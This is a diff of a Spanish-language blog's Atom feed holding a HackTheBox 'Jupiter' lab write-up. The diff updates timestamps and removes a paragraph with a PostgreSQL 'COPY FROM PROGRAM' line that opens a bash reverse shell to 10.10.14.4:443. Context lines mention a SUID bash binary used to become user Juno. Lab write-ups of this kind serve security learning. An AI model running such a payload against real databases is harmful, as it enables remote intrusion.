@@ -1,5 +1,5 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><generator uri="https://jekyllrb.com/" version="4.2.0">Jekyll</generator><link href="/feed.xml" rel="self" type="application/atom+xml" /><link href="/" rel="alternate" type="text/html" hreflang="en" /><updated>2023-06-27T11:33:24-06:00</updated><id>/feed.xml</id><title type="html">c4rta</title><subtitle>Soy Omar, un radioaficionado amante de la ciberseguridad
-</subtitle><author><name>Omar</name></author><entry><title type="html">HackTheBox Jupiter - SQLi a RCE, Movimiento lateral via Jupyter y YAML</title><link href="/blog/posts/2023-06-26-htb-jupiter/" rel="alternate" type="text/html" title="HackTheBox Jupiter - SQLi a RCE, Movimiento lateral via Jupyter y YAML" /><published>2023-06-26T00:00:00-06:00</published><updated>2023-06-27T11:33:24-06:00</updated><id>/blog/posts/htb-jupiter</id><content type="html" xml:base="/blog/posts/2023-06-26-htb-jupiter/">&lt;h2 id=&quot;enumeracion&quot;&gt;Enumeracion&lt;/h2&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><generator uri="https://jekyllrb.com/" version="4.2.0">Jekyll</generator><link href="/feed.xml" rel="self" type="application/atom+xml" /><link href="/" rel="alternate" type="text/html" hreflang="en" /><updated>2023-06-27T20:34:08-06:00</updated><id>/feed.xml</id><title type="html">c4rta</title><subtitle>Soy Omar, un radioaficionado amante de la ciberseguridad
+</subtitle><author><name>Omar</name></author><entry><title type="html">HackTheBox Jupiter - SQLi a RCE, Movimiento lateral via Jupyter y YAML</title><link href="/blog/posts/2023-06-26-htb-jupiter/" rel="alternate" type="text/html" title="HackTheBox Jupiter - SQLi a RCE, Movimiento lateral via Jupyter y YAML" /><published>2023-06-26T00:00:00-06:00</published><updated>2023-06-27T16:13:14-06:00</updated><id>/blog/posts/htb-jupiter</id><content type="html" xml:base="/blog/posts/2023-06-26-htb-jupiter/">&lt;h2 id=&quot;enumeracion&quot;&gt;Enumeracion&lt;/h2&gt;
 
 &lt;p&gt;Iniciamos con un escaneo de nmap con:&lt;/p&gt;
 
@@ -398,8 +398,6 @@ ID           Response   Lines    Word       Chars       Payload
       &lt;span class=&quot;na&quot;&gt;start_time&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;5s&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p&gt;Y depues de unos segundos en el directorio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/tmp&lt;/code&gt; tendremos el binario bash con permisos SUID, solo ejecutamos y ya somos Juno, ah este punto ya tenemos la flag de user&lt;/p&gt;
-
-&lt;p&gt;CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM ‘bash -c &quot;bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.14.4/443 0&amp;gt;&amp;amp;1&quot;’;&lt;/p&gt;
 
 &lt;h2 id=&quot;movimiento-lateral-de-juno-a-jovian&quot;&gt;Movimiento lateral de Juno a Jovian&lt;/h2&gt;
 
